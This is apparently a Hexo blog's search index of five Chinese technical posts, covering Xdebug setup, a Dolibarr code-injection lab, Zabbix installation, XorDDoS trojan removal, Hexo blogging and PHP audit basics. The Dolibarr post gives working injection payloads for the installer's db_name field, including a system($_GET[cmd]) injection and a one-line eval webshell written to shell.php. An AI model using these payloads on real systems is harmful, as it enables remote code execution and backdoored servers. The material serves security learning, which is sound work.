<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[Phpstorm+phpstudy+xdebug+Dolibarr]]></title>
    <url>%2F2018%2F08%2F11%2FPhpstorm-phpstudy-xdebug-Dolibarr%2F</url>
    <content type="text"><![CDATA[【前言】 PhpStorm 是 JetBrains 公司开发的一款商业的 PHP 集成开发工具，旨在提高用户效率，可深刻理解用户的编码，提供智能代码补全，快速导航以及即时错误检查。phpStudy是一个PHP调试环境的程序集成包。该程序包集成最新的Apache+PHP+MySQL+phpMyAdmin+ZendOptimizer,一次性安装，无须配置即可使用，是非常方便、好用的PHP调试环境·该程序不仅包括PHP调试环境，还包括了开发工具、开发手册等·总之学习PHP只需一个包。 【准备】先从网上下载PhpStorm和Phpstudy软件，版本不限定。在第一次打开Phpstorm时，需要输入注册码，具体方法可参考https://blog.csdn.net/finish_dream/article/details/80045514 亲测有效。 【配置步骤】进行phpStudy+PhpStorm+XDebug的配置，因为phpStudy集成了XDebug扩展，所以不用单独下载XDebug。 1.phpStudy当前版本确定，我们用PHP-5.5.38的版本。 2.在其他选项菜单-&gt;打开配置文件-&gt;php.ini，滑到最后看到[XDebug]节点做如下的修改： 123456789101112131415161718192021222324252627282930313233343536373839404142434445[XDebug];性能分析文件的存放位置，默认值为/tmpxdebug.profiler_output_dir=&quot;G:\PHP\PhpStudy\tmp\xdebug&quot;;函数调用跟踪信息输出文件目录，默认值为/tmpxdebug.trace_output_dir=&quot;G:\PHP\PhpStudy\tmp\xdebug&quot;;zend_extension=&quot;G:\PHP\PhpStudy\php\php-5.5.38\ext\php_xdebug.dll&quot;zend_extension=&quot;G:\PHP\PhpStudy\php\php-5.5.38\ext\php_xdebug.dll&quot;;是否允许Xdebug跟踪函数调用，跟踪信息以文件形式存储，默认值为0xdebug.auto_trace=1;是否允许Xdebug跟踪函数参数，默认值为0xdebug.collect_params=1;是否允许Xdebug跟踪函数返回值，默认值为0xdebug.collect_return=1;打开xdebug的性能分析器，以文件形式存储，这项配置是不能以ini_set()函数配置的，默认值为0xdebug.profiler_enable = 1;性能分析文件的命名规则，默认值为cachegrind.out.%pxdebug.profiler_output_name = &quot;cachegrind.out.%t.%p&quot;xdebug.remote_enable = 1;用于zend studio远程调试的应用层通信协议xdebug.remote_handler = &quot;dbgp&quot;xdebug.idekey = PHPSTORMxdebug.remote_host = &quot;127.0.0.1&quot;xdebug.remote_port = 9000 3.打开Phpstorm，需要打开或者新创一个项目，这里我们打开Phpstudy的根目录作为项目。在PhpStudy软件的解压目录下的www文件夹就是我们的网站根目录。 open -&gt;选择相应目录的WWW文件，点OK，再点OK 完成项目的创建。 4.选择PHP的版本信息。 Debug端口设置 IDEKEY： 配置PHP Web Application 查看配置： xdebug配置完成了 3.实现截取操作 在火狐或是谷歌浏览器中下载插件Xdebug helper，图标为一只吃虫子的标志。点击Debug启动Xdebug helper。 在Pphstorm中写好一个php文件，并开启如下的选项，左上角的电话图标。 选择一个浏览器打开写好的文件 截取到了内容，或者你点击网页的刷新，会在phpstrom中打开相应的php文件，也说明截取到了。 Dolibarr ERP/CRM php代码注入漏洞Dolibarr ERP &amp; CRM是一个用于管理的组织的活动(联系人、供应商、发票、订单、股票、议程…)。它是一个用PHP语言编写的开源软件，支持mysql,mssql,pgsql。专为小型、中型或大型公司、基金会和自由职业者设计。 1、先配置好Dolibarr环境。 将Dolibarr的压缩包解压到PhpStudy的WWW的目录下。 然后打开Phpstuduy，点击其他选项菜单-&gt;Phpstudy设置-&gt;端口常规设置，在网站目录中选择dolibarr目录中的hedocs文件，然后点击应用。 打开浏览器输入127.0.0.1/install 然后点击开始进行dolibarr的安装。账户密码均为root，然后一直下一步，直至安装完毕。 安装完毕后，会在Phpstrom中自动截取到step1.php的文件。 2、开始代码的修改。 step1.php文件第55行接受了我们传递的db_name参数并执行了GETPOST方法 按F7跟进GETPOST，在functions.lib.php第512行，GETPOST方法根据接收的check值进行不同的操作，此处接收的check值为alpha。我们看到在switch的alpha代码块中，对db_name的值进行了双引号和../的过滤。 ALT+SHIFT=F7跳回step1.php,在接收了全部参数，并确定没有错误的情况下。在文件517行对配置文件进行了备份并调用write_conf_file方法将参数写入配置文件。 继续跟进528行write_conf_file,函数首先定义了所需要的全局变量来获取参数值，并把配置写入/conf/conf.php文件。 继续往下走，直接定位到写入数据库名称的代码段 提交时前台会有js检测，用burp来截断修改我们的参数值，注意在提交时要勾选创建数据库复选框，否则配置文件写入不成功。 数据库名称改为dolibarr \’;phpinfo();// 配置文件也进行了正常写入，但是虽然已经正常写入了代码，如果直接访问配置文件被阻止 Ø通过包含此文件的文件去间接的执行代码 更改payload，执行系统命令并getshell 将db_name改为dolibarr \’;system($_GET[cmd]);// 访问/insex.php?cmd={command} 修改命令为echo “&lt;?php @eval($_POST[topsec])?&gt;”&gt; 网站绝对路径/shell.php 请求后会在网站根目录下生成一句话木马，尝试用菜刀连接]]></content>
      <categories>
        <category>安全工具</category>
      </categories>
      <tags>
        <tag>PHP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Zabbix可视化监控的搭建]]></title>
    <url>%2F2018%2F08%2F10%2FZabbix%E5%8F%AF%E8%A7%86%E5%8C%96%E7%9B%91%E6%8E%A7%E7%9A%84%E6%90%AD%E5%BB%BA%2F</url>
    <content type="text"><![CDATA[【前言】 zabbix（音同 za:bix）是一个基于WEB界面的提供分布式系统监视以及网络监视功能的企业级的开源解决方案。zabbix能监视各种网络参数，保证服务器系统的安全运营；并提供灵活的通知机制以让系统管理员快速定位/解决存在的各种问题。zabbix由2部分构成，zabbix server与可选组件zabbix agent。zabbix server可以通过SNMP，zabbix agent，ping，端口监视等方法提供对远程服务器/网络状态的监视，数据收集等功能，它可以运行在Linux，Solaris，HP-UX，AIX，Free BSD，Open BSD，OS X等平台上。 0x01 【操作环境】CentOS Linux release 7.5.1804 (Core)zabbix版本：zabbix-3.4.12 0x02 【环境准备】1、LAMP安装和启动：12345Apache安装：yum install http* -y Apache启动：systemctl start httpd Mariadb安装：yum install mariadb-server mariadb -y Mariadb启动：systemctl start mariadb.service PHP安装：yum install php php-mysql php-common php-gd php-mbstring php-mcrypt php-devel php-xml php-bcmath -y LAMP安装参考资料：https://www.cnblogs.com/me80/p/7218883.html 2、GCC环境安装1yum install gcc gcc-c++ autoconf automake zlib zlib-devel openssl openssl-devel pcre pcre-devel -y 3、selinux和防火墙处理进入seliunx配置文件123vim /etc/selinux/config SELINUX=disabled #重启才生效selinux：setenforce 0 #临时关闭systemctl stop firewalld.service #关闭防火墙 0x03 【安装步骤】一、安装zabbix1、在官网下载zabbix安装包，https://www.zabbix.com/download2、解压软件包并安装依赖包123cd /usr/local/src tar -zxvf zabbix-3.4.12.tar.gz yum -y install net-snmp-devel libxml2-devel libcurl-deve libevent libevent-devel libcurl 3、编译安装zabbix123cd zabbix-3.4.3/ #切换进入zabbix目录 ./configure --prefix=/data/server/zabbix --enable-server --enable-agent --with-mysql --enable-ipv6 --with-net-snmp --with-libcurl --with-libxml2 #编译zabbix make&amp;&amp;make install #安装zabbix,此步骤有点长，请耐心等待。 二、配置zabbix1、创建用户账户对于所有Zabbix的守护进程，需要一个无特权的用户。如果Zabbix守护进程以一个无特权的用户账户启动，那么它会使用该用户运行。然而，如果一个守护进程以‘root’用户启动，它会切换为‘zabbix’用户账户，且这个用户必须存在。在Linux系统中，可以使用下面命令建立一个用户（该用户属于自己的用户组，“zabbix”）：12groupadd zabbixuseradd -g zabbix zabbix 2、数据库导入zabbix template使用数据库用户zabbix登录数据库123456mysql –uzabbix –puse zabbix; #切换到zabbix库#导入zabbix默认表source /usr/local/src/zabbix-3.4.12/database/mysql/schema.sql; source/usr/local/src/zabbix-3.4.12/database/mysql/images.sql;source /usr/local/src/zabbix-3.4.12/database/mysql/data.sql; 3、创建zabbix用户和日志目录并给予权限123useradd -s /sbin/nologin zabbix #创建用户mkdir /usr/local/zabbix/logs #创建目录chown -R zabbix:zabbix /usr/local/zabbix #给予权限 4、配置zabbix的服务端（server）123456789101112vim /data/server/zabbix/etc/zabbix_server.conf &gt;LogFile=/data/server/zabbix/logs/zabbix_server.logPidFile=/data/server/zabbix/zabbix_server.pidDBHost=localhostDBName=zabbixDBUser=zabbixDBPassword=123456DBSocket=/data/server/mysql/mysql.sockTimeout=4LogSlowQueries=3000Include=/data/server/zabbix/etc/zabbix_server.conf.d/*.conf 5、配置zabbix客户端（agent）123456789vim /data/server/zabbix/etc/zabbix_agentd.conf&gt;PidFile=/data/server/zabbix/zabbix_agentd.pidLogFile=/data/server/zabbix/logs/zabbix_agentd.logServer=127.0.0.1ListenPort=10050ServerActive=127.0.0.1Hostname=Zabbix serverInclude=/data/server/zabbix/etc/zabbix_agentd.conf.d/*.conf 6、配置PHP相应的文件123456789vim /etc/php.ini&gt;php_value max_execution_time 300php_value memory_limit 128Mphp_value post_max_size 16Mphp_value upload_max_filesize 2Mphp_value max_input_time 300php_value always_populate_raw_post_data -1date.timezone = Asia/Shanghai 7、安装zabbix web界面123mkdir /var/www/html/zabbixcd /usr/local/src/zabbix-3.4.0/frontends/php cp -a . /var/www/html/zabbix 8、启动zabbix服务1234systemctl start httpd #启动apache服务/data/server/mysql/support-files/mysql.server start #启动数据库服务/data/server/zabbix/sbin/zabbix_server #启动zabbix服务端服务/data/server/zabbix/sbin/zabbix_agentd #在所有的被监控机器上启动zabbix_agentd 三、配置zabbix前端1、在你的浏览器中，打开Zabbix URL： http://&lt;服务器IP或主机名&gt;/zabbixhttp://192.168.199.206/zabbix/setup.php你可以看到前端安装向导的第一个页面。 2、确认满足所有的软件安装前置条件,如果下图这些显示Failed，那么我们编辑/etc/php.ini，将下图中的配置项都改成要求的大小，未配置的项进行手动添加vim /etc/php.ini 如果出现PHP xmlwiter，PHP smlreader off 那么请键入下条命令yum install php-bcmath php-mbstring php-xmlwriter php-xmlreaderPHP LDAP Warning 不用管，直接下一步 3、输入连接数据库的详细信息。Zabbix数据库必须是已经创建好的。 4、输入Zabbix Server的详细信息。 5、检查设置信息。 6、下载配置文件，将它放置在Web服务器HTML文档子目录（即你复制Zabbix PHP文件的目录）的conf/路径下。cd /var/www/html/zabbix/confrz使用rz命令上传就可以了 7、上传完毕后，完成安装。 8、Zabbix前端已经就绪！默认的用户名是Admin，密码是zabbix。 登录后显示界面： 使用说明参考文档：https://www.zabbix.com/documentation/3.4/manual/quickstart/login 0x04 【参考文献】https://www.zabbix.com/download?zabbix=3.4&amp;os_distribution=centos&amp;os_version=7&amp;db=MySQLhttps://www.cnblogs.com/kowloon/p/7771495.htmlhttp://blog.51cto.com/xpu2001/2052634]]></content>
      <categories>
        <category>运维</category>
      </categories>
      <tags>
        <tag>zabbix</tag>
        <tag>监控</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[记一次XorDDos木马的清除]]></title>
    <url>%2F2018%2F08%2F10%2F%E8%AE%B0%E4%B8%80%E6%AC%A1XorDDos%E6%9C%A8%E9%A9%AC%E7%9A%84%E6%B8%85%E9%99%A4%2F</url>
    <content type="text"><![CDATA[【前言】 一种名为“XOR.DDoS”的新型木马出现，该木马能够感染32位和64位的Linux系统，通过安装rootkit来隐藏自身，并可通过DDoS攻击形成僵尸网络。XOR.DDoS木马原理是杀毒软件公司Avast在它们的博客中解释了这种新的威胁，该木马可以根据目标Linux系统环境的不同来相应调整安装方式，并安装一个rootkit来躲避杀毒软件的检测。黑客首先通过SSH暴力登录目标Linux系统，然后尝试获得根用户证书。如果成功，则通过一个shell脚本安装该木马，该shell脚本的功能主要包括：主程序、环境检测、编译、解压、安装等。该木马首先通过受害系统的内核头文件来进行兼容性检测，如果成功匹配则继续安装一个rootkit，以此来隐藏木马自身。 0x01 【实现环境】CentOS Linux release 7.5.1804 (Core) 在植入木马之前一定要记得把虚拟机的网络设置成NAT或host-only模式防止病毒传播到本机或造成破坏！ 0x02 【植入木马】把XorDDos的病毒样本上传到liunx机器中，进行解压，运行木马文件，执行完之后发现木马自毁了文件，可知是一个并不一般的木马。12345unzip XorDDos样本-密码123.zip chmod +x a753cb1ff86c742bb497155362664c3b ./a753cb1ff86c742bb497155362664c3b sh b3c466263551794bb247c68ff1bc357a.sh ./b3c466263551794bb247c68ff1bc357a 0x03 【杀马全过程】1.发现cpu使用超高、网络流量异常、服务器还会出现卡顿现象。通过top发现会有几个可疑的程序占用了CPU。1top 2.执行tcpdump -i ens33后发现网络的流量异常，不断在往外发送请求。1tcpdump -i ens33 3.通过lsof -i 看到了一个可疑的服务，PID为1657。1lsof -i 4.尝试着杀掉这个进程 kill -9 1657，发现又起了另一个服务进程，猜测这个木马会不断的改名自启。1kill -9 1657 查杀思路：由于运行进程有多个相互保护（参考一下pstree），而且和病毒文件直接也是相互配合，如果直接删除也会重新生成一个新的病毒文件，所以查杀的基本的思路是：删除定时任务中的病毒启动—&gt;破坏病毒文件使其不可执行（不要删除，否会自动生成）—&gt;停止系统病毒进程—&gt;删除病毒文件—&gt;清理感染文件—&gt;关闭病毒开机启动以下查杀可以自由组合，按上面查杀思路排列即可！ 5.查看木马进程的位置。(proc之后跟的数字文件就是程序的PID)1ll /proc/9257 我们还可以尝试使用rkhunter或chkrootkit工具看看有哪些文件被木马篡改过。步骤略。 6.查看计划任务，没有发现任何任务，可是其他同学会发现，从而可以定位木马的目录在/etc/cron.hourly/1crontab -l #查看计划任务 1ll /etc/cron.hourly/ #发现了木马的执行文件位置 7.先对木马文件去权 chmod 000 uzsziblfy.sh ，然后查看里面的文件信息。也可以尝试将木马执行文件下载下来进行反编译，不过一定要先对其去权。1cat /etc/cron.hourly/ccyfuny.sh 对其文件去权chmod 000 /usr/bin/ccyfuny 8.利用ll -aR /etc/rc.d查看木马文件的连接，红色一直在闪烁的是之前删除了的木马。1ll -aR /etc/rc.d 对其去权 chmod 000 /etc/init.d/ccyfuny 9.reboot重启系统,然后查看CPU和开放端口以及进程情况。查看top没有发现可疑程序。1top 也没发现可疑的进程1lsof -i 也没发现可疑的端口开放1netstat -anlpt 10.所有文件去完权后，接着清除所有的可疑文件：123rm -rf /usr/bin/ccyfuny ccyfuny.shrm -rf /etc/cron.hourly/ccyfuny.sh rm -rf /etc/init.d/ccyfuny 11.再reboot重启系统，并没有发现可疑文件了。12netstat -anlptlsof -i 总结，先去除所有可疑执行文件的执行权限，然后重启，再删除所有可疑文件，再重启，就大功告成了。 0x04 【参考文件】https://blog.csdn.net/gosenkle/article/details/80220788https://blog.csdn.net/rigous/article/details/73970391]]></content>
      <categories>
        <category>木马查杀</category>
      </categories>
      <tags>
        <tag>木马查杀</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Hexo-GitHub搭建静态博客平台(Next主题)]]></title>
    <url>%2F2018%2F08%2F09%2FHexo-GitHub%E6%90%AD%E5%BB%BA%E9%9D%99%E6%80%81%E5%8D%9A%E5%AE%A2%E5%B9%B3%E5%8F%B0-Next%E4%B8%BB%E9%A2%98%2F</url>
    <content type="text"><![CDATA[gitHub是一个面向开源及私有软件项目的托管平台，因为只支持git 作为唯一的版本库格式进行托管，故名gitHub。 Hexo 是一个快速、简洁且高效的博客框架。Hexo 使用 Markdown（或其他渲染引擎）解析文章，在几秒内，即可利用靓丽的主题生成静态网页。 0x01 准备工作域名我的域名：www.dizai.tech，主要是提升自我逼格，不愿意花钱就跳过此步骤。国内可以去阿里云或腾讯云购买域名，价格也很便宜。 环境技术前往github官网https://github.com 注册一个github账号。 Hexo 的安装前提就是得有 Node.js 和 Git 。 这里，我们要区分清楚git与github。git是一个版本控制的工具，而github有点类似于远程仓库，用于存放用git管理的各种项目。 下面提供相关的官方版本地址，安装教程去网上搜一下就很多。 Node 官方版本安装：https://nodejs.org/en/ Git 官方版本安装：https://git-scm.com/download/win 我用到软件版本（你们可以在官方下载最新版的） Git：Git-2.18.0-64-bit Node：node-v10.7.0-x64 验证安装：任何位置鼠标右击出现Git Bash Here cmd下 1git --version 验证安装：cmd下 1node -v 0x02 Github 配置创建仓库 new repository在自己的GitHub账号下创建一个新的仓库，命名为username.github.io（username 是你的账号名)。 在这里，要知道，GitHub Pages有两种类型：User/Organization Pages 和 Project Pages，而我所使用的是User Pages。 简单来说，User Pages 与 Project Pages的区别是： User Pages 是用来展示用户的，而 Project Pages 是用来展示项目的。 用于存放 User Pages 的仓库必须使用username.github.io的命名规则，而 Project Pages 则没有特殊的要求。 User Pages 将使用仓库的 master 分支，而 Project Pages 将使用 gh-pages 分支。 User Pages 通过 http(s)://username.github.io 进行访问，而 Projects Pages通过 http(s)://username.github.io/projectname 进行访问。 另外注意： 注册的邮箱一定要验证，否则不会成功； 仓库名字必须是：username.github.io，其中username是你的用户名； 仓库创建成功不会立即生效，需要过一段时间，大概10-30分钟，或者更久，我的等了半个小时才生效； 0x03 配置SSH key用于本地与github数据交换生成并配置key执行如下命令12git config --global user.name &quot;liuxianan&quot; #你的github用户名git config --global user.email &quot;xxx@qq.com&quot; #填写你的github注册邮箱 生成ssh密钥12cd ~/. ssh #检查本机已存在的ssh密钥ssh-keygen -t rsa -C &quot;邮件地址&quot; #生成密钥 连续按回车三次（使用默认ssh密钥生成策略），密钥生成成功，存于本地用户目录(~)，打开.ssh\id_rsa.pub文件，并复制其中内容 打开你的github主页，进入个人设置-&gt; SSH and GPG keys -&gt; New SSH key： title任意填写，将内容复制到key中即可 测试ssh本地执行 ssh -T git@github.com #注意邮箱地址不用改如果提示Are you sure you want to continue connecting (yes/no)?，输入yes，然后会看到： Hi xxx! You’ve successfully authenticated, but GitHub does not provide shell access. 看到这个信息说明SSH已配置成功！ 0x04 安装hexo以下命令都是在git命令行中实现 首先在本地磁盘中建立一个Hexo文件夹用于存储本地文件(做本地文件保存以及测试使用)然后在文件夹中右击打开git命令框(我第一次直接在桌面右击，所以命令行无效果) 在git命令框中安装Hexo 1npm install -g hexo 初始化 1hexoinit 1hexo init 此目录会自动生成hexo相关文件 注：此处目录中会存在一个_config.yml的文件，为hexo的主配置文件，以后我们称其为站点配置文件。 本地预览 hexo目录中执行123hexo clean #清除缓存hexo g #生成静态页面hexo s #启动本地预览服务 执行命令后，hexo会在public文件夹生成相关html文件，用于本地预览与后期提交github 浏览器访问[http://127.0.0.1:4000或localhost:4000，即可看到hexo默认生成页面hello,world] 0x05 写博客进入hexo根目录 1hexo new &apos;my-first-blog&apos; ‘ ‘中为你本篇博客的名称，执行完成后，会自动在\hexo\source_posts\目录下生成.md文件， 只要打开这个文件就可以写博客了。（.md的文件必须用支持markdown的编辑器） 0x06 上传到github上传前的配置配置站点配置文件_config.yml中的deploy部分： 1234deploy: type: git repository: git@github.com:yourname/yourname.github.io.git branch: master 安装上传插件1npm install hexo-deployer-git --save 上传文件在hexo根目录下 1hexo d 会将有所改动的内容全部提交至github 常用hexo命令123456789101112131415161718hexo new &quot;postName&quot; #新建文章hexo new page &quot;pageName&quot; #新建页面hexo generate #生成静态页面至public目录hexo server #开启预览访问端口（默认端口4000，&apos;ctrl + c&apos;关闭server）hexo deploy #部署到GitHubhexo help #查看帮助hexo version #查看Hexo的版本hexo clean #清除缓存缩写：hexo n == hexo newhexo g == hexo generatehexo s == hexo serverhexo d == hexo deploy组合命令：hexo s -g #生成并本地预览hexo d -g #生成并上传 0x07 更改默认hexo主题及优化主题下载进入hexo根目录 执行 1git clone https://github.com/iissnan/hexo-theme-next themes/next 执行完成后会在hexo\themes\ 目录下生成next目录 next目录下也会存在一个_config.yml文件，这是next主题的主配置文件，以后我们称为主题配置文件 你也可以自己更换自己喜欢的主题https://hexo.io/themes/ ，官网有很多主题， 主题应用配置站点配置文件 寻找theme字段，将其值修改为next（next前都有一个空格，否则会报错） 主题预览执行 123hexo clean #清除缓存hexo g #重新生成代码hexo s #部署到本地 浏览器访问 http://127.0.0.1:4000 查看效果 0x08 主题简单优化设置布局主题配置文件中 寻找 Scheme 字段，next提供三种默认主题布局，将你想使用的布局取消注释即可 123#scheme: Muse#scheme: Mistscheme: Pisces Muse - 默认 Scheme，这是 NexT 最初的版本，黑白主调，大量留白 Mist - Muse 的紧凑版本，整洁有序的单栏外观 Pisces - 双栏 Scheme，小家碧玉似的清新 设置显示语言站点配置文件中 寻找language 字段，设置其值为 1language: zh-Hans 语言文件位于hexo\themes\next\languages目录下 设置菜单主题配置文件中 寻找menu字段 123456789menu: home: / || home #主页 categories: /categories/ || th #分类页 tags: /tags/ || tags #标签页 about: /about/ || user #关于页 #archives: /archives/ || archive #归档页 #schedule: /schedule/ || calendar #sitemap: /sitemap.xml || sitemap #commonweal: /404/ || heartbeat #公益404 除主页与归档页外，其余页面需要手动创建 每行中 || 后的内容为指定此menu的图标 添加标签页新建页面 进入hexo根目录 1hexo new page tags 命令执行后，hexo\source\tags目录中生成index.md文件 设置页面类型 修改此index.md文件为(添加type行) 123title: tagsdate: 2016-11-15 19:10:05type: &quot;tags&quot; 设置具体博客文章tags 对于hexo\source_post目录下具体博客文章设置tags(设置tags行) 123title: 基于Hexo和Github搭建博客date: 2016-11-09tags: [npm, hexo, github] 添加分类页面新建页面 进入hexo根目录 1hexo new page categories 命令执行后，hexo\source\categories目录中生成index.md文件 设置页面类型 修改此index.md文件为(添加categories行) 123title: categoriesdate: 2016-11-15 19:11:13type: &quot;categories&quot; 设置具体博客文章categories 对于hexo\source_post目录下具体博客文章设置categories(设置categories行) 1234title: 基于Hexo和Github搭建博客date: 2016-11-09tags: [npm, hexo, github]categories: 搭建博客 添加关于页面添加页面 进入hexo根目录 1hexo new page about 命令执行后，hexo\source\about目录中生成index.md文件 修改index.md文件 123456789title: aboutdate: 2016-11-15 19:08:50## 关于我一只学习的小菜鸟，欢迎分享知识。QQ：Email: 设置站内搜索进入hexo根目录 1npm install hexo-generator-searchdb --save 站点配置文件中添加 12345search: path: search.xml field: post format: html limit: 10000 0x09 其他设置hexo 首页文章只显示一部分在博客文章适当位置添加&lt;!--more--&gt; 标记即可 网站底部字数统计进入hexo根目录 1npm install hexo-wordcount --save hexo\themes\next\/layout_partials\footer.swig文件中末尾添加 1234&lt;div class=&quot;theme-info&quot;&gt; &lt;div class=&quot;powered-by&quot;&gt;&lt;/div&gt; &lt;span class=&quot;post-count&quot;&gt;博客全站共&#123;&#123; totalcount(site) &#125;&#125;字&lt;/span&gt;&lt;/div&gt; 修改文章底部的带#号的标签修改hexo\themes\next\layout_macro\post.swig文件，搜索rel=&quot;tag&quot;&gt;# ，改为&lt;i class=&quot;fa fa-tag&quot;&gt;&lt;/i&gt; 在每篇文章末尾统一添加“本文结束”标记在hexo\themes\next\layout_macro目录下，新建passage-end-tag.swig ，并添加如下内容 12345&lt;div&gt; &#123;% if not is_index %&#125; &lt;div style=&quot;text-align:center;color: #ccc;font-size:14px;&quot;&gt;-------------本文结束&lt;i class=&quot;fa fa-paw&quot;&gt;&lt;/i&gt;感谢您的阅读-------------&lt;/div&gt; &#123;% endif %&#125;&lt;/div&gt; 接着打开hexo\themes\next\layout_macro\post.swig文件，在post-body 之后添加 12345&lt;div&gt; &#123;% if not is_index %&#125; &#123;% include &apos;passage-end-tag.swig&apos; %&#125; &#123;% endif %&#125;&lt;/div&gt; 打开主题配置文件，在末尾添加 123# 文章末尾添加“本文结束”标记passage_end_tag: enabled: true 0x010 访问线上博客执行hexo cleanhexo ghexo d浏览器访问https://yourname.github.io （yourname是你的github用户名） 设置域名解析ping一下你的博客域名，获取其IP地址 在阿里云或腾讯云设置域名解析 在Hexo目录下的source中建一个CNAME命名的文件夹(切记没有后缀) 右键新建txt文本-&gt;输入你购买的域名www.ainusers.top-&gt;保存关闭 然后快捷键F2或者右键该文本重命名-&gt;将.txt后缀去掉-&gt;会提示文件不可用继续确定即可 上传进入hexo目录 hexo cleanhexo ghexo d即可使用自定义域名访问博客，并且原博客域名也不会失效 Hexo Admin后台管理博客工具使用hexo+github确实非常方便管理自己的知识，但是缺点在于每次在本地使用markdown工具写完笔记，都要进行生成静态页面，然后本地预览或者上传github操作，操作非常繁琐。所以在这里配置使用Hexo Admin工具对博客进行管理，简化操作。 Hexo Admin介绍官方网站：https://jaredforsyth.com/hexo-admin/属于hexo插件系列，使用B/S架构对博客进行后台管理 安装进入/hexo目录git bash下1npm install --save hexo-admin 访问hexo后台管理界面git bash下1hexo server -d 访问http://localhost:4000/即可访问本地博客 访问http://localhost:4000/admin即可进入Hexo Admin后台管理界面 配置Hexo AdminSettings选项下 点击Setup authentification here 配置你的Hexo Admin登陆账户及密码，以及加密cookies的字符串 下方会生成配置文件字段，将此复制到站点目录下_config.yml中 重启hexo server -d，再次访问http://localhost:4000/admin则需输入账号密码登陆。 参考连接https://www.cnblogs.com/liuxianan/p/build-blog-website-by-hexo-github.htmlhttp://theme-next.iissnan.com/getting-started.htmlhttp://shenzekun.cn/hexo%E7%9A%84next%E4%B8%BB%E9%A2%98%E4%B8%AA%E6%80%A7%E5%8C%96%E9%85%8D%E7%BD%AE%E6%95%99%E7%A8%8B.htmlhttps://www.cnblogs.com/syd192/p/6074323.html https://blog.csdn.net/ainuser/article/details/77609180]]></content>
      <categories>
        <category>搭建博客</category>
      </categories>
      <tags>
        <tag>博客</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[PHP代码审计 基础知识]]></title>
    <url>%2F2018%2F08%2F08%2FPHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%2F</url>
    <content type="text"><![CDATA[本文记录 PHP 代码审计的学习过程 PHP 代码审计博客目录 1. 环境准备1.1 测试运行环境安装 wamp 1.2 PHP 编写工具 EditPlu Notepad++ Zendstudio 10 百度云下载链接 1.3 代码审计工具Seay源代码审计系统 百度云下载链接 1.4 代码审计平台 DVWA GitHub 链接 ZVulDrill GitHub 链接 2. 注释 单行注释 =&gt; //单行注释 多行注释 =&gt; /*多行注释*/ 3. 单引号和双引号 单引号不解析变量 双引号解析变量 aaa=’123’ echo &apos;$aaa&apos; =&gt; 结果为 $aaa echo &quot;$aaa&quot; =&gt; 结果为 123 4. 输出函数 echo 或者 print：最简单的输出方法 print_r、var_dump(var_export)、debug_zval_dump：输出变量数据值，特别是数组和对象数据 var_dump 会额外输出数据类型 print_r：输出格式很整齐，跟var_dump 的区别是没有类型数据，并且布尔值的 false 和 NULL 输出为空 var_export：所有的数据是可以作为组织好的变量输出的，都是能够作为直接赋值使用；需要注意的一点是, var_export 对于资源型的变量会输出NULL debug_zval_dump：输出结果跟 var_dump 类似，唯一增加的一个值是 refcount，就是记录一个变量被引用了多少次，这是 php 的copy on write (写时复制) 的机制的一个重要特点。 5. 超全局变量1超全局变量——超全局变量是在全部作用域中始终可用的内置变量 1. 简介 在php 中可由用户操作的全局变量列表如下: $GLOBALS — 引用全局作用域中可用的全部变量 $_SERVER — 服务器和执行环境信息 $_GET — HTTP GET 变量 $_POST — HTTP POST 变量 $_FILES — HTTP 文件上传变量 $_REQUEST — HTTP Request 变量 $_SESSION — Session 变量 $_ENV — 环境变量 $_COOKIE — HTTP Cookies 已经被弃用的超全局变量 $_HTTP_COOKIE_VARS $_HTTP_ENV_VARS $_HTTP_GET_VARS $_HTTP_POST_FILES $_HTTP_POST_VARS $_HTTP_SERVER_VARS 2. 超全局变量示例 $GLOBALS 例一：1234567891011121314151617&lt;?php$moon=&quot;1&quot;;echo $GLOBALS[&apos;moon&apos;];?&gt;# 显示结果为1# 例二&lt;?phpfunction test()&#123; echo $moon=&quot;2&quot;; echo $GLOBALS[&apos;moon&apos;];&#125;$moon=&quot;1&quot;;test();?&gt;# 显示结果为 21 # 函数内部为局部变量，不被 $GLOBALS 所识别 $_SERVER test1.php &lt;?php print_r($_SERVER); ?&gt; 12345test2.php &lt;?php $_SERVER=&apos;aaaaaa&apos;; print_r($_SERVER); ?&gt; 输出结果为服务器的配置信息 输出结果可以被覆盖 $_GET test.php &lt;?php print_r($_GET); ?&gt; 输出结果为 URL 中的 GET 变量的数据 $_POST test.php &lt;?php print_r($_POST); ?&gt; 输出结果为 URL 中的 POET 变量的数据 $_FILES file.html&lt;lable for=&quot;file&quot;&gt;Filename:&lt;/lable&gt; &lt;input type=&quot;file&quot; name=&quot;file&quot; id=&quot;file&quot; /&gt; &lt;br /&gt; &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;Submit&quot; /&gt; &lt;/form&gt; test.php&lt;?phpprint_r($_FILES);?&gt; 输出结果为提交的文件的信息 $_REQUEST 1234567891011121314 test1.php &lt;?php print_r($_REQUEST); ?&gt; test2.php &lt;?php $_REQUEST=&apos;aaaaaa&apos;; print_r($_REQUEST); ?&gt;输出结果可以被覆盖![](https://i.imgur.com/W6GgqVz.png) $_SESSION test1.php &lt;?php print_r($_SESSION); ?&gt; 12345test2.php &lt;?php $_SESSION=&apos;aaaaaa&apos;; print_r($_SESSION); ?&gt; 输出结果可以被覆盖 $_ENV test1.php &lt;?php print_r($_ENV); ?&gt; 12345678910test2.php &lt;?php $_ENV=&apos;aaaaaa&apos;; print_r($_ENV); ?&gt;test3.php &lt;?php print_r($_ENV[&apos;OS&apos;]=&apos;bbbbbb&apos;); ?&gt; 输出结果可以被覆盖 $_COOKIE test.php &lt;?php print_r($_COOKIE); ?&gt; 输出结果为 cookie 值]]></content>
      <categories>
        <category>编程</category>
      </categories>
      <tags>
        <tag>代码审计</tag>
        <tag>php</tag>
      </tags>
  </entry>
</search>
